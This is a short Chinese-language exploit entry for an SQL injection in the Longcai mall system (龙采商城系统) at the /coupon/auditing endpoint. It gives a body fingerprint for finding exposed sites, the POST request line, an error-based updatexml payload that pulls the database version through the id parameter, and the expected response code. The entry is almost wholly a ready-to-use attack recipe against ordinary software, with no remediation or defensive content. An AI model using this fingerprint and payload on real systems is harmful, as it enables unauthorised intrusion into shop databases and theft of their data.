# 龙采商城系统auditing存在SQL注入漏洞

龙采商城系统 ｜ SQL注入 ｜ —
- **指纹**：`body="'url':'/pc2.0/index/index'"`
- **请求**：`POST /coupon/auditing HTTP/1.1`

**Payload**
```
id=1%20and%20updatexml(1,concat(0x7e,@@version,0x7e),1)
```
- **响应特征**：200